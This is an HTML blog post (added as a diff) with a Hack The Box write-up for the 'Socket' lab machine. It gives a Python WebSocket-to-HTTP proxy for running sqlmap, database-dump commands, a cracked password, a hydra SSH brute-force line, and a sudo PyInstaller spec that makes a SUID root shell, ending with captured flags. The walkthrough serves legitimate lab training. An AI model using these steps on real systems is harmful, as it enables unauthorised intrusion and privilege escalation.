@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Socket - HTB Writeup | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Socket - HTB Writeup</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-05-04</time>
+    <span>in</span>
+    
+      <a href="/categories/hack-the-box">Hack The Box</a>
+  </strong>
+  <span> • 525 words</span>
+  <span> • 3 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/websockets">WebSockets</a>, 
+        <a href="/tags/sqli">SQLi</a>
+    </div>
+  
+</div>
+
+      <div class="content"><h1 id="socket---htb-writeup">Socket - HTB Writeup</h1>
+<p><strong>Difficulty</strong>: Medium</p>
+<p>IP=<code>10.10.11.206</code></p>
+<p>After the initial enumeration and finding open ports on <code>22, 80, 5789</code>. We can try connecting to websockets running on port <code>5789</code> with <code>wscat</code>. Very quickly, we find a <code>sqli</code> vulnerability within the service. Which allows us the opportunity to get the admin password hash. Which is just simple MD5. After running this through crackstation.com, the password/username is:
+<code>admin:denjanjade122566</code>.</p>
+<h3 id="sqlmap-through-proxy">SQLMAP through proxy</h3>
+<p>We already explored the <code>/version</code> path and extracted credentials with it due to a SQLi vulnerability, we can try now the same vulnerability but with the <code>/update</code> path. In this case instead of manual exploitation we will try to automate the exploitation with the help of a proxy and <a href="https://sqlmap.org/">sqlmap</a>.</p>
+<h4 id="proxy">Proxy</h4>
+<p>Due to the fact SQLMap only works with GET and POST requests we need to create an abstraction that enables us to interact with the websocket from these types of requests. This we will use a proxy that can be seen in this <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">blogpost</a>, with some tweaks for our usecase:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> SimpleHTTPRequestHandler
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> socketserver <span style="color:#f92672">import</span> TCPServer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> unquote, urlparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> websocket <span style="color:#f92672">import</span> create_connection
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ws_server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ws://qreader.htb:5789/update&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_ws</span>(payload):
+</span></span><span style="display:flex;"><span>	ws <span style="color:#f92672">=</span> create_connection(ws_server)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># If the server returns a response on connect, use below line	</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># For our case, format the payload in JSON</span>
+</span></span><span style="display:flex;"><span>	message <span style="color:#f92672">=</span> unquote(payload)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># replacing &#39; with \\&#34; to avoid breaking JSON structure</span>
+</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;version&#34;:&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;</span> <span style="color:#f92672">%</span> message
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ws<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>	resp <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>	ws<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> resp:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">middleware_server</span>(host_port,content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span>):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomHandler</span>(SimpleHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>				payload <span style="color:#f92672">=</span> urlparse(self<span style="color:#f92672">.</span>path)<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
+</span></span><span style="display:flex;"><span>				payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>				
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> payload:
+</span></span><span style="display:flex;"><span>				content <span style="color:#f92672">=</span> send_ws(payload)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;No parameters specified!&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#34;Content-type&#34;</span>, content_type)
+</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>end_headers()
+</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(content<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">_TCPServer</span>(TCPServer):
+</span></span><span style="display:flex;"><span>		allow_reuse_address <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	httpd <span style="color:#f92672">=</span> _TCPServer(host_port, CustomHandler)
+</span></span><span style="display:flex;"><span>	httpd<span style="color:#f92672">.</span>serve_forever()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Starting MiddleWare Server&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Send payloads in http://localhost:8081/?id=*&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	middleware_server((<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>,<span style="color:#ae81ff">8081</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>Now if we test the bridge built between the <code>sqlmap</code> and the websocket by running both:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 proxy.py 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting MiddleWare Server
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Send payloads in http://localhost:8081/?id<span style="color:#f92672">=</span>*
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8081/?id=1&#34;</span> --batch --dbs
+</span></span></code></pre></div><p>Afterr running this, we can see sqlmap successfully interacting with the websocket service.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8081/?id=1&#34;</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --tables
+</span></span></code></pre></div><p>Next:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://localhost:8081/?id=1&#34;</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> -T answers --dump
+</span></span></code></pre></div><p>I couldn&rsquo;t find much useful information, so I ended up just brute forcing <code>SSH</code> using <code>hydra</code> and the password found earlier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p denjanjade122566 ssh://10.10.11.206
+</span></span></code></pre></div><p>From this, we find the user <code>tkeller</code>.</p>
+<h5 id="ssh-login-as-tkeller">SSH Login as tkeller</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh tkeller@10.10.11.206
+</span></span><span style="display:flex;"><span>denjanjade122566
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tkeller@socket:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> tkeller on socket:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User tkeller may run the following commands on socket:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/sbin/build-installer.sh
+</span></span><span style="display:flex;"><span>tkeller@socket:~$ echo <span style="color:#e6db74">&#39;import os;os.system(&#34;mkdir /tmp/ep &amp;&amp; cp /bin/bash /tmp/ep/bash &amp;&amp; chmod u+s /tmp/ep/bash&#34;)&#39;</span> &gt; b17.spec
+</span></span><span style="display:flex;"><span>tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build b17.spec 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">416</span> INFO: PyInstaller: 5.6.2
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">416</span> INFO: Python: 3.10.6
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">419</span> INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">424</span> INFO: UPX is not available.
+</span></span><span style="display:flex;"><span>tkeller@socket:~$ ls /tmp/ep
+</span></span><span style="display:flex;"><span>bash
+</span></span><span style="display:flex;"><span>tkeller@socket:~$ /tmp/ep/bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>tkeller<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>tkeller<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>tkeller<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>shared<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash-5.1# ls /root
+</span></span><span style="display:flex;"><span>cleanup  root.txt  snap
+</span></span><span style="display:flex;"><span>bash-5.1# cat /root/root.txt
+</span></span><span style="display:flex;"><span>a0b47c925a1a1844500df525e4da5c91
+</span></span><span style="display:flex;"><span>bash-5.1# ls
+</span></span><span style="display:flex;"><span>b17.spec  user.txt
+</span></span><span style="display:flex;"><span>bash-5.1# cat user.txt
+</span></span><span style="display:flex;"><span>16c7bda674a650ae654c5b63fd5da842
+</span></span><span style="display:flex;"><span>bash-5.1#
+</span></span></code></pre></div></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
